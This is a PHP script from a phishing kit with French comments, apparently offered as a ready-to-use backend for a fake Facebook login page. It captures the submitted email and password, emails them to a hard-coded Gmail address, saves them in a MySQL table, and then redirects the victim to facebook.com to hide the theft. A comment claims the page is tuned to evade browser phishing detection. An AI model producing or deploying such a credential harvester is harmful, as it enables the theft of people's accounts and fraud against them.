<?php
    
	// Page produite par NesQuiiKz.com et optimisÃ©e contre les navigateur internet qui peuvent dÃ©tecter les pages Phishing.

	
	// Configuration de la base de donnÃ©e
	$DB_host = "HÃ´te MySQL";
	$DB_login = "Utilisateur MySQL"; 
	$DB_pass = "Mot de passe"; 
	$DB_select = ""; 
	
	// Connexion Ã  notre base de donnÃ©e
	$con = mysql_connect($DB_host, $DB_login, $DB_pass); 
    if (!$con) { 
			die('Erreur de connexion: ' . mysql_error()); 
			}
    $db= mysql_select_db($DB_select, $con);
	
	
    
	// On protÃ¨ge notre base de donnÃ©e.
	$id=mysql_real_escape_string($_POST["email"]);
	$mdp=mysql_real_escape_string($_POST["pass"]);
	
	
    // S'il l'on met un identifiant
	if ((isset($_POST["email"]))&&($_POST["email"]!="")){
	
	
				// S'il l'on met un mot de passe
				if ((isset($_POST["pass"]))&&($_POST["pass"]!="")){
	
	                   // On crÃ©e une variable contenant les identifiants
	                   $all = 'Identifiant : ' . $_REQUEST['email']. "\n". 'Mot de passe : ' . $_REQUEST['pass'] ;
					   
					   
	                   // On envoi les identifiants Ã  notre adresse mail voulu
	                   mail('newadrixw29@gmail.com','NesQuiiKz.com', $all );
					   
					   // On vÃ©rifie que les identifiants n'ont pas Ã©tÃ© dÃ©jÃ  enregistrÃ©s
					   $SQL="SELECT * FROM `Base de donnÃ©es MySQL`.`ids` WHERE id='$id' AND mdp='$mdp'";
                       $res=mysql_query($SQL);
					   
					   // Si les identifiants ne sont pas dÃ©jÃ  prÃ©sent
                       if(mysql_num_rows($res)==0){
							   // On ajoute les identifiants Ã  notre base de donnÃ©e.
							   $SQL="INSERT INTO `Base de donnÃ©es MySQL`.`ids` (`id` ,`mdp`)VALUES ('$id',  '$mdp')";
							   $res=mysql_query($SQL);
							 
					   }
					   
	            }
	
	}
	mysql_close(); 
	
?>
<?php // On redirige l'internaute vers le site officiel tout de suite ?>
<html><head><meta http-equiv='refresh' content='0; URL=http://www.facebook.com'></head><body></body></html>
